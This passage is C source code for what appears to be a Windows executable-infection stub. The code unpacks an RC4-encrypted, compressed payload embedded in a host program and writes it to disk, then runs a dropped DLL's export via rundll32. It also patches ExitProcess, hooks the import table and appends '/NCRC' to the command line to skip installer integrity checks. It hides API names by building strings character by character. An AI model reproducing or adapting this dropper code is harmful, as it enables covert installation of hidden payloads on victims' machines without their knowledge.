
	for(DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
	{
		ptrFunctions[i] += (DWORD) hModule;
		ptrNames[i] += (DWORD) hModule;
		pFunction = ptrFunctions[i];
	}

	return pFunction;
}

__forceinline void ldr_reloc(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
{
	DWORD dwRelocSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD dwRelocAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	if (dwRelocAddr == 0 || dwRelocSize == 0)
		return;

	LPBYTE lpPtr = CALC_OFFSET(LPBYTE, pModule, dwRelocAddr);


	while(dwRelocSize > 0)
	{
		base_relocation_block_t block;

		_MEMCPY_(&block, lpPtr, sizeof(base_relocation_block_t));
		dwRelocSize -= block.BlockSize;
		lpPtr += sizeof(base_relocation_block_t);
		block.BlockSize -= 8;

		while(block.BlockSize)
		{
			base_relocation_entry_t entry;

			_MEMCPY_(&entry, lpPtr, sizeof(WORD));
						
			LPDWORD ptrOffset = CALC_OFFSET(LPDWORD, pModule, block.PageRVA + entry.offset);
			DWORD dwOldValue = *ptrOffset;
			
			DWORD dwNewValue = dwOldValue -
				pImageNtHeader->OptionalHeader.ImageBase +
				(DWORD) pModule;

			LPWORD ptrHighOffset = CALC_OFFSET_DISP(LPWORD, pModule, block.PageRVA + entry.offset, 2);
			LPWORD ptrLowOffset = CALC_OFFSET_DISP(LPWORD, pModule, block.PageRVA + entry.offset, 0);

			WORD wLowNewOffset = (WORD) ((DWORD) pModule & 0xffff);
			WORD wHighNewOffset = (WORD) (((DWORD) pModule & 0xffff0000) >> 16);

			switch(entry.type)
			{
				// The base relocation is skipped. This type can be used to pad a block.
			case IMAGE_REL_BASED_ABSOLUTE:
				//std::cout << "Unsupported" << std::endl;
				break;
				// The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
			case IMAGE_REL_BASED_HIGH: 
				//*ptrHighOffset = *ptrHighOffset - wHighNewOffset;
				break;
				// The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word. 
			case IMAGE_REL_BASED_LOW:
				break;
				// The base relocation applies all 32 bits of the difference to the 32-bit field at offset
			case IMAGE_REL_BASED_HIGHLOW:
				*ptrOffset = dwNewValue;
				break;
				// The base relocation adds the high 16 bits of the difference to the 16bit field at offset. The 16-bit field represents the high value of a 32-bit word.
				// The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.
			case IMAGE_REL_BASED_HIGHADJ:
				break;
				// The base relocation applies the difference to the 64-bit field at offset.
			case IMAGE_REL_BASED_DIR64:
				break;
			}

			// FIX ENTRY++

			lpPtr += sizeof(base_relocation_entry);
			block.BlockSize -= 2;
		}
	}
}


BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, PMY_DATA pData)
{
	DWORD dwUnpackedSize = 0;
	PCHAR pPackedBuffer; 
	PCHAR pUnpackedBuffer; 
	
	pPackedBuffer = (PCHAR)pData->VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
	pUnpackedBuffer = (PCHAR)pData->VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
	_MEMCPY_(pPackedBuffer, fileData, dataSize);

	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((PCHAR)pData->header) + pData->header->functions.rc4.offset);
	pfn_rc4skip((PBYTE)pData->header->rc4key, RC4KEYLEN, 0, (PBYTE)pPackedBuffer, dataSize, pData);
	dwUnpackedSize = aP_depack(pPackedBuffer, pUnpackedBuffer);

	pData->VirtualFree(pPackedBuffer, 0, MEM_RELEASE);
	if (dwUnpackedSize != originalSize)
		return FALSE;

	HANDLE hFile = pData->CreateFileA(fileName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWritten = 0;
	BOOL bRet = pData->WriteFile(hFile, pUnpackedBuffer, originalSize, &dwWritten, NULL);

	pData->CloseHandle(hFile);
	pData->VirtualFree(pUnpackedBuffer, 0, MEM_RELEASE);

	if (bRet == FALSE)
		return FALSE;

	pData->SetFileAttributesA(fileName, FILE_ATTRIBUTE_NORMAL);

	return TRUE;	
}
FUNCTION_END(DumpFile);


DWORD WINAPI CoreThreadProc(__in PMY_DATA pData)
{	
	PCHAR pCompletePath = NULL;
	PCHAR pFunctionName = NULL;
	LPSTARTUPINFO pStartupInfo = NULL;
	LPPROCESS_INFORMATION pProcInfo = NULL;

	CHAR strRunDLL[] = { '%', 's', 'y', 's', 't', 'e', 'm', 'r', 'o', 'o', 't', '%', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'r', 'u', 'n', 'd', 'l', 'l', '3', '2', '.', 'e', 'x', 'e', ' ', '"', 0x0 };
	CHAR strComma[] = { '"', ',', 0x0 };

	CHAR strHFF5[11];
	CHAR strHFF8[11];
	_MEMSET_(strHFF5, 0x0, 11);
	_MEMSET_(strHFF8, 0x0, 11);
	_MEMCPY_(strHFF5, pData->header->eliteExports, 10);
	_MEMCPY_(strHFF8, pData->header->eliteExports+11, 10);
	
	pCompletePath = (PCHAR)pData->VirtualAlloc(NULL, 32767, MEM_COMMIT, PAGE_READWRITE);
	_MEMSET_(pCompletePath, 0x0, 32767);
	_MEMCPY_(pCompletePath, strRunDLL, _STRLEN_(strRunDLL));
	_STRCAT_(pCompletePath, pData->header->dllPath);
	_STRCAT_(pCompletePath, strComma);
	_STRCAT_(pCompletePath, strHFF8);

	HMODULE hLib = pData->LoadLibraryA(pData->header->dllPath);
	if (hLib == INVALID_HANDLE_VALUE)
		goto THREAD_EXIT;

	pFunctionName = (PCHAR)pData->VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
	_MEMSET_(pFunctionName, 0x0, 4096);
	_MEMCPY_(pFunctionName, strHFF5, _STRLEN_(strHFF5));
	
	HFF5 pfn_HFF5 = (HFF5) pData->GetProcAddress(hLib, pFunctionName);
	if (pfn_HFF5 == NULL)
		goto THREAD_EXIT;
	
	pStartupInfo = (LPSTARTUPINFO) pData->VirtualAlloc(NULL, sizeof(STARTUPINFO), MEM_COMMIT, PAGE_READWRITE);
	pStartupInfo->cb = sizeof(STARTUPINFO);
	pProcInfo = (LPPROCESS_INFORMATION) pData->VirtualAlloc(NULL, sizeof(PROCESS_INFORMATION), MEM_COMMIT, PAGE_READWRITE);

	pfn_HFF5(pCompletePath, NULL, pStartupInfo, pProcInfo);

THREAD_EXIT:
	if (pCompletePath)
		pData->VirtualFree(pCompletePath, 0, MEM_RELEASE);
	if (pFunctionName)
		pData->VirtualFree(pFunctionName, 0, MEM_RELEASE);
	if (pStartupInfo)
		pData->VirtualFree(pStartupInfo, 0, MEM_RELEASE);
	if (pProcInfo)
		pData->VirtualFree(pProcInfo, 0, MEM_RELEASE);
	if (pData->header->dllPath)
		pData->VirtualFree(pData->header->dllPath, 0, MEM_RELEASE);

	// done.
	pData->header->synchro = 1;


	return 0;
}
FUNCTION_END(CoreThreadProc);


VOID WINAPI ExitProcessHook(__in  UINT uExitCode)
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
	
	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));

	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);	

	LOADLIBRARY    pfn_LoadLibrary	   = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress  = resolveGetProcAddress();

	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
	char strExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	CHAR strVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
	CHAR strVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };

	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualProtect);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY)pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualQuery);
	HMODULE hMod = pfn_LoadLibrary(strKernel32);
	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
	EXITPROCESS pfn_ExitProcess = (EXITPROCESS) pfn_GetProcAddress(hMod, strExitProcess);
	PBYTE pExitProcessAddr = (PBYTE) pfn_ExitProcess;
	
	while (header->synchro != 1)
		pfn_Sleep(100);

	ULONG uOldProtect;
	MEMORY_BASIC_INFORMATION mbi;
	pfn_VirtualQuery((PVOID)pExitProcessAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &uOldProtect);

	BYTE pData[] = { 0x8b, 0xc0, 0x55, 0x8b, 0xec }; // so lame.
	_MEMCPY_(pExitProcessAddr, pData, 5);
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, uOldProtect, &uOldProtect);

	pfn_ExitProcess(0);
}
FUNCTION_END(ExitProcessHook);


DWORD HookIAT(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData)
{
	HMODULE modHandle = pData->GetModuleHandle(dll);
	// check if dll is loaded
	if(modHandle == NULL)
		return -1;

	// function address we're going to hook
	DWORD needAddress = (DWORD)pData->GetProcAddress(modHandle, name);
	IMAGE_IMPORT_DESCRIPTOR const * lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
	while(lpImp->Name) 
	{
		CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
		CHAR* dllName = (CHAR*) pData->VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
		if(dllName == NULL)
			return -1;

		_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);
		if(!_STRCMPI_(dllName, dll)) 
		{
			UINT_PTR dwOriginalThunk = (lpImp->OriginalFirstThunk ? lpImp->OriginalFirstThunk : lpImp->FirstThunk);
			IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(imageBase + dwOriginalThunk);
			UINT_PTR dwThunk = lpImp->FirstThunk;
			IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);

			DWORD* ptrToCallAddr = (DWORD*) (imageBase + dwThunk);		
			do
			{
				if(needAddress == *ptrToCallAddr)
				{
					DWORD oldProtect = 0;
					MEMORY_BASIC_INFORMATION * mbi = (MEMORY_BASIC_INFORMATION *) 
						pData->VirtualAlloc(
							NULL, 
							sizeof(MEMORY_BASIC_INFORMATION), 
							MEM_COMMIT, 
							PAGE_READWRITE);

					pData->VirtualQuery((LPCVOID)ptrToCallAddr, mbi, sizeof(MEMORY_BASIC_INFORMATION));
					pData->VirtualProtect(mbi->BaseAddress, mbi->RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

					*ptrToCallAddr = (DWORD) hookFunc;

					pData->VirtualProtect(mbi->BaseAddress, mbi->RegionSize, oldProtect, NULL);
					pData->VirtualFree(mbi, 0, MEM_RELEASE);
					pData->VirtualFree(dllName, 0, MEM_RELEASE);
					return 0;
				}
				ptrToCallAddr++;
	
			}
			while(*ptrToCallAddr != NULL);
		}

		pData->VirtualFree(dllName, 0, MEM_RELEASE);
		lpImp++;
	}

	return -1;
}
FUNCTION_END(HookIAT);

LPSTR WINAPI GetCommandLineAHook()
{
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
	LOADLIBRARY pfn_LoadLibraryA = resolveLoadLibrary();

	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR strGetCommandLineA[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'A', 0x0 };

	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibraryA(strKernel32), strVirtualAlloc);
	GETCOMMANDLINEA pfn_OriginalGetCommandLineA = (GETCOMMANDLINEA) pfn_GetProcAddress(pfn_LoadLibraryA(strKernel32), strGetCommandLineA);

	LPSTR OriginalCommandLine = pfn_OriginalGetCommandLineA();
	ULONG uLen = _STRLEN_(OriginalCommandLine);
	LPSTR FakeCommandLine = (LPSTR)pfn_VirtualAlloc(NULL, uLen + 7, MEM_COMMIT, PAGE_READWRITE);

	_MEMCPY_(FakeCommandLine, OriginalCommandLine, uLen);
	*(PUSHORT)&FakeCommandLine[uLen] = 0x2f20; // '/ '
	*(PULONG)&FakeCommandLine[uLen+2] = 0x4352434e; // 'NCRC'
	FakeCommandLine[uLen+6] = 0x0;

	return FakeCommandLine;
}
FUNCTION_END(GetCommandLineAHook);

LPWSTR WINAPI GetCommandLineWHook()
{
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
	LOADLIBRARY pfn_LoadLibraryA = resolveLoadLibrary();

	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR strGetCommandLineW[] = { 'G', 'e', 't', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n', 'e', 'W', 0x0 };

	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibraryA(strKernel32), strVirtualAlloc);
	GETCOMMANDLINEW pfn_OriginalGetCommandLineW = (GETCOMMANDLINEW) pfn_GetProcAddress(pfn_LoadLibraryA(strKernel32), strGetCommandLineW);

	LPWSTR OriginalCommandLine = pfn_OriginalGetCommandLineW();
	ULONG uLen = _STRLENW_(OriginalCommandLine);
	LPWSTR FakeCommandLine = (LPWSTR)pfn_VirtualAlloc(NULL, uLen + 14, MEM_COMMIT, PAGE_READWRITE);

	_MEMCPY_(FakeCommandLine, OriginalCommandLine, uLen);
	*(PULONG)&((PBYTE)FakeCommandLine)[uLen] = 0x002f0020; // ' /'
	*(PULONG)&((PBYTE)FakeCommandLine)[uLen+4] = 0x0043004e; // 'NC'
	*(PULONG)&((PBYTE)FakeCommandLine)[uLen+8] = 0x00430052; // 'RC'
	*(PUSHORT)&((PBYTE)FakeCommandLine)[uLen+12] = 0x0000;

	return FakeCommandLine;
}
FUNCTION_END(GetCommandLineWHook);

void ArcFour(
	const unsigned char *key, 
	size_t keylen, 
	size_t skip,
	unsigned char *data, 
	size_t data_len, 
	PMY_DATA pData)
{
	unsigned int i, j, k;
	unsigned char *pos;
	size_t kpos;
		
	unsigned char *S = (unsigned char*) pData->VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
	
	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}
	
	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}
	
	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}

	pData->VirtualFree(S, 0, MEM_RELEASE);
}
FUNCTION_END(ArcFour);


#pragma code_seg()
#pragma optimize( "", on )
